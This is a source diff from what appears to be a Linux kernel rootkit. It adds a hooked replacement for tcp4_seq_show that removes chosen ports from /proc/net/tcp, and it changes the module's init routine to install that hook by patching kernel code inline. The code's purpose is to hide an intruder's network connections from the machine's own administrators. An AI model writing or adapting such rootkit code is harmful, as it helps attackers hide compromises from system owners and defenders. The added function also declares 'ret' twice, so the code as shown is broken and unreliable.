@@ -631,6 +631,37 @@ void *get_tcp_seq_show ( const char *path )
     return ret;
 }
 
+static int n_tcp4_seq_show ( struct seq_file *seq, void *v)
+{
+    int ret = 0;
+    char port[12];
+    struct hidden_port *hp;
+
+/*
+    hijack_pause(tcp4_seq_show);
+    ret = tcp4_seq_show(seq, v);
+    hijack_resume(tcp4_seq_show);
+*/
+	
+    int (*original_tcp4_seq_show)(struct seq_file *, void *);
+    original_tcp4_seq_show = asm_hook_unpatch(n_tcp4_seq_show);
+    int ret = original_tcp4_seq_show(seq, v);
+    asm_hook_patch(n_tcp4_seq_show);
+
+    list_for_each_entry ( hp, &hidden_tcp4_ports, list )
+    {
+        sprintf(port, ":%04X", hp->port);
+
+        if ( strnstr(seq->buf + seq->count - TMPSZ, port, TMPSZ) )
+        {
+            seq->count -= TMPSZ;
+            break;
+        }
+    }
+
+    return ret;
+}
+
 // Macros to help reduce repeated code where only names differ.
 // Decreses risk of "copy-paste & forgot to rename" error.
 
@@ -983,7 +1014,7 @@ int init(void)
     //tcp4_seq_show = get_tcp_seq_show("/proc/net/tcp");
     //hijack_start(tcp4_seq_show, &n_tcp4_seq_show);
 	
-    asm_hook_create(get_tcp_seq_show("/proc/net/tcp"), get_tcp_seq_show);
+    asm_hook_create(get_tcp_seq_show("/proc/net/tcp"), n_tcp4_seq_show);
 	
 
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 32) && \
